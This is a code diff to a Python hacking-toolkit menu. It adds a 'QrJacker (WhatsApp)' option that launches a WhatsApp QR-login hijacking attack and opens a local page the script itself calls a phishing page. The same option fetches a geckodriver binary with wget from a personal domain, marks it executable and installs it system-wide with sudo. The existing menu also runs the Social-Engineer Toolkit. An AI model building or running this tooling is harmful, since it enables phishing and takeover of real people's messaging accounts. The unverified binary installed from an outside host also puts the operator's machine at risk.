@@ -60,6 +60,8 @@ class SearchShodan:
                 if vulns == True:
                     print("[{}+{}] Vulnerabilities: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, json.dumps(data.get('vulns', 'null'), sort_keys=True, indent=2)))
                 print('')
+            print("Results saved in {}result/Shodan.json{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
+            time.sleep(2)
             banner()
             main()
 
@@ -365,6 +367,7 @@ def mainExploits():
     print("")
     print("[{}01{}] Cam Hack".format(color, Fore.LIGHTWHITE_EX))
     print("[{}02{}] SET".format(color, Fore.LIGHTWHITE_EX))
+    print("[{}03{}] QrJacker ({}WhatssApp{})".format(color, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
     print("")
     print("[{}99{}] Back".format(color, Fore.LIGHTWHITE_EX))
     print("")
@@ -378,6 +381,22 @@ def mainExploits():
 
     elif option == '02' or option == '2':
         os.system("sudo setoolkit")
+
+    elif option == '03' or option == '3':
+        if os.path.exists("geckodriver") == False:
+            os.system("wget https://z0172ck.me/Files/geckodriver")
+            os.system("chmod +x geckodriver")
+            os.system("sudo cp -f geckodriver /usr/local/share/geckodriver")
+            os.system("sudo ln -s /usr/local/share/geckodriver /usr/local/bin/geckodriver")
+            os.system("sudo ln -s /usr/local/share/geckodriver /usr/bin/geckodriver")
+        
+        print("")
+        print("Recuerde ir a {}127.0.0.1:1337{} para ver la pagina Phishing".format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
+        os.system("firefox 127.0.0.1:1337 &")
+        print("")
+        time.sleep(2)
+        os.system("cd modules/QRLJacker/ && python3 QrlJacker.py -q -r .ataque")
+        mainExploits()
 
     elif option == '99':
         banner()
